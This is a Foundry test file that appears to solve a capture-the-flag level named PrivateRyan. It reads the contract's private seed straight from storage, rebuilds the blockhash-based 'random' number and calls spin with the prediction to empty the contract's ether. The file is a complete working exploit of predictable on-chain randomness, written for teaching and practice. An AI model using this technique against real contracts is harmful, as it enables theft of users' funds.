// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 seed = uint256(vm.load(address(instance), bytes32(uint256(0))));

        uint256 blockNumber = block.number - seed;
        bytes32 blockHash = blockhash(blockNumber);
        uint256 factor = (
            1157920892373161954135709850086879078532699843656405640394575840079131296399 * 100
        ) / 100;
        uint256 prediction = uint256(uint256(blockHash) / factor) % 100;

        instance.spin{value: 0.01 ether}(prediction);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
